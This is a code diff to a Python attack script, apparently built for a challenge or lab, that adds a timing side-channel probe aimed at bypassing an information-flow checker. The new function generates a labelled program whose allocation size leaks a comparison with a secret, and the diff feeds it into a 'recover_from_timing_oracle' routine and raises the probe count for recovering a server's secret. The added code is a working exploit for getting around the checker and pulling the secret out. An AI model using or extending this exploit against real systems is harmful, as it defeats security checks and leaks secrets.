@@ -950,6 +950,19 @@ def make_short_circuit_timing_program(*, term_count: int) -> str:
 """
 
 
+def make_array_alloc_timing_program(*, scale: int, mod_base: int) -> str:
+    # Attempt a checker-bypass timing channel where both branches are expression-only,
+    # but runtime work differs due to alloc_array size. No explicit loops/assignments.
+    return f"""int main(int input, int secret) {{
+  //@label H;
+  int[] A = alloc_array(int, ((input % {mod_base}) + 1) * ({scale}));
+  //@label H;
+  bool burn = (secret < input) && (\\length(A) >= 0);
+  return 0;
+}}
+"""
+
+
 def recover_from_timing_oracle(
     *,
     server_command: str,
@@ -962,6 +975,7 @@ def recover_from_timing_oracle(
     calibration_repeats = max(5, repeats)
     burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
     sc_term_candidates = [200, 400, 800, 1600, 3200, 6400]
+    alloc_timing_candidates = [(2000, 1021), (4000, 1021), (8000, 509)]
     min_ratio = 1.015
     min_gap_s = 0.0010
     min_boundary_consistency = 0.80
@@ -979,6 +993,13 @@ def recover_from_timing_oracle(
             (
                 f"short-circuit-terms={term_count}",
                 make_short_circuit_timing_program(term_count=term_count),
+            )
+        )
+    for scale, mod_base in alloc_timing_candidates:
+        candidates.append(
+            (
+                f"alloc-timing-scale={scale}-mod={mod_base}",
+                make_array_alloc_timing_program(scale=scale, mod_base=mod_base),
             )
         )
 
@@ -1453,7 +1474,7 @@ def recover_server_secret(
                 userid=userid,
                 timeout_s=tuned_query_timeout,
                 debug=debug,
-                max_probes=96,
+                max_probes=220,
             ),
         ),
         (
